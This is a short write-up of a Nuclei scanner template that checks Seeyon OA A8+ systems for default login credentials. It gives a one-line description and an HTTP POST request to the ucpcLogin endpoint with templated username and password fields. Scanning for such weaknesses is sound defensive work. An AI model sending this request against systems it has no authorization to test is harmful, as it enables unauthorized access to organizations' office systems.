# Nuclei Template: Seeyon OA A8 - Default Login
**Template ID:** seeyon-a8-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`seeyon-a8-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Seeyon (seeyon) OA A8+ Enterprise Edition has a weak password vulnerability, which can be used to log in to the background

## Steps to reproduce / Exploit Payload
```http
POST /seeyon/rest/authentication/ucpcLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

UserAgentFrom=iphone&login_username={{username}}&login_password={{password}}
```

